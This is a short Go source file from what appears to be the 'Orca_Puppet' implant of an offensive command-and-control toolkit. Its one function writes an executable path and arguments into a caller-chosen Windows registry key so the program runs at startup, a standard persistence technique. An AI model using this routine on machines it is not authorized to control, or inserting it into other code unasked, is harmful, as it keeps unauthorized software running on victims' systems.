package persistopt

import (
	"Orca_Puppet/define/debug"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"strings"
)

func AddWinReg(name, path, args, regKey string) error {
	regkeys := strings.Split(regKey, "\\")
	var keyHandle registry.Key
	switch regkeys[0] {
	case "HKCU", "CURRENT_USER", "HKEY_CURRENT_USER":
		keyHandle = registry.CURRENT_USER
		break
	case "HKLM", "LOCAL_MACHINE", "HKEY_LOCAL_MACHINE":
		keyHandle = registry.LOCAL_MACHINE
		break
	case "HKCR", "CLASSES_ROOT", "HEKY_CLASSES_ROOT":
		keyHandle = registry.CLASSES_ROOT
		break
	case "USERS", "HKEY_USERS":
		keyHandle = registry.USERS
		break
	case "CURRENT_CONFIG", "HKEY_CURRENT_CONFIG":
		keyHandle = registry.CURRENT_CONFIG
		break
	case "PERFORMANCE_DATA", "HKEY_PERFORMANCE_DATA":
		keyHandle = registry.PERFORMANCE_DATA
		break
	}
	regKeyx := strings.Join(regkeys[1:], "\\")
	key, err := registry.OpenKey(keyHandle, regKeyx, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()
	regPath := fmt.Sprintf("\"%s\" %s", path, args)
	err = key.SetStringValue(name, regPath)
	if err != nil {
		return err
	}
	debug.DebugPrint("Successfully add to startup items.")
	return nil
}
